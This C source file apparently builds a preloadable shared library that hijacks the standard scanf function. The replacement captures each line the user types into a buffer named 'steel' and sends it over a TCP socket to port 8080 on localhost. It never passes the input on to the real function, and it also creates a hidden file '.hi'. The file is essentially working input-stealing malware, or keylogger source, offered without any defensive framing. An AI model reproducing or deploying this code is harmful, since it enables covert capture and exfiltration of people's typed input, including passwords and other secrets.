#include <stdio.h>
#include <stdarg.h>
#include <dlfcn.h>

#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr

#define OBJ_PATH "/lib/x86_64-linux-gnu/libc.so.6"
#define HIDDEN_FILE ".hi"
#define TRUE 1
#define FALSE 0




typedef int (*sym)(const char *, ...);
void* handle;
FILE* fd;
static void myinit() __attribute__((constructor));
static void mydest() __attribute__((destructor));

void myinit() 
{
	fd = fopen(HIDDEN_FILE,"w");
    handle = dlopen(OBJ_PATH,RTLD_LAZY);
}

void mydest() 
{
    dlclose(handle);
    fclose(fd);
}

int scanf ( const char * format, ... )
{
	char steel[1000];
	char c = 0;
	int i = 0;
	int stoleInput = FALSE;
	while (c != '\n') {
		c = getchar();
		steel[i] = c;
		i++;
		stoleInput = TRUE;
	}

    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bzero(&servaddr, sizeof(servaddr));

    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);

    connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) ;


    write(sockfd, steel, sizeof(steel));

    // close the socket
    close(sockfd);




	return stoleInput;
}
